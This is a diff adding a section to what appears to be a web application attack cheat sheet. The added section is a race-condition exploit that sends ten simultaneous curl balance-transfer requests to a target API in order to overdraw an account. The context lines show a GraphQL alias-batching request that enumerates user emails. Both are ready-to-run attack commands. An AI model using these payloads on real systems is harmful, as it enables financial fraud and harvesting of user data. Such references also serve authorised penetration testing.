@@ -890,3 +890,29 @@ curl -X POST http://target/graphql \
   -H "Content-Type: application/json" \
   -d '{"query": "{ a1: user(id:1){email} a2: user(id:2){email} a3: user(id:3){email} a4: user(id:4){email} a5: user(id:5){email} a6: user(id:6){email} a7: user(id:7){email} a8: user(id:8){email} a9: user(id:9){email} a10: user(id:10){email} }"}'
 ```
+
+---
+
+## 16. Race Condition Business Logic Attack
+
+### TOCTOU Exploit for Balance Transfer
+
+```bash
+# Time-of-Check-Time-of-Use race condition on balance transfer
+# The application checks balance THEN deducts -- exploit the window
+# Requires concurrent requests faster than the check-deduct cycle
+
+# Turbo Intruder equivalent using parallel curl processes
+# Send 10 simultaneous transfer requests for the same $100 balance
+for i in $(seq 1 10); do
+  curl -s -X POST http://target/api/v1/transfer \
+    -H "Authorization: Bearer $TOKEN" \
+    -H "Content-Type: application/json" \
+    -d '{"from":"ACCOUNT_A","to":"ACCOUNT_B","amount":100}' &
+done
+wait
+
+# Check if multiple transfers succeeded (balance went negative)
+curl -s http://target/api/v1/accounts \
+  -H "Authorization: Bearer $TOKEN" | jq '.[].balance'
+```
